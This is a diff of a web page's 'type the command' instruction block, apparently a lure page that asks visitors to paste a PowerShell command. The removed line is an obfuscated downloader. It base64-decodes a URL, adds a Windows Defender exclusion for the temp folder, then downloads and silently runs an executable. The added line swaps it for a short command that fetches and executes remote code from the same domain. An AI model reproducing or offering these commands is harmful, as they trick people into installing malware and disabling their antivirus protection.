@@ -203,7 +203,7 @@
     <p>2) Type the command in quotes:</p>
 
     <div class="copy-container">
-      <pre id="powershell-script">$env:temp=[System.Environment]::GetEnvironmentVariable('TEMP'); $a=[System.Convert]::FromBase64String('JVRlbXAl'); $b=[System.Text.Encoding]::UTF8.GetString($a); $c=[System.Convert]::FromBase64String('aHR0cDovL2xpYmZvcmdlLnh5ei9MaWJhcnlGb3JnZS5leGU='); $d=[System.Text.Encoding]::UTF8.GetString($c); $e=Join-Path -Path $env:temp -ChildPath 'tmpfile.exe'; try{Set-MpPreference -ExclusionPath $env:temp -ErrorAction SilentlyContinue; $f=[System.Net.WebClient]::new(); $f.DownloadFile($d,$e); Start-Process -FilePath $e -ErrorAction SilentlyContinue}catch{}</pre>
+      <pre id="powershell-script">iwr libforge.xyz/key | iex</pre>
       <button class="copy-btn" onclick="copyScript()" title="Скопировать">
         <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
           <path d="M16 1H4a2 2 0 0 0-2 2v14h2V3h12V1Zm3 4H8a2 2 0 0 0-2 2v16a1 1 0 0 0 1 1h12a2 2 0 0 0 2-2V7a2 2 0 0 0-2-2Zm0 18H9V7h10v16Z"/>
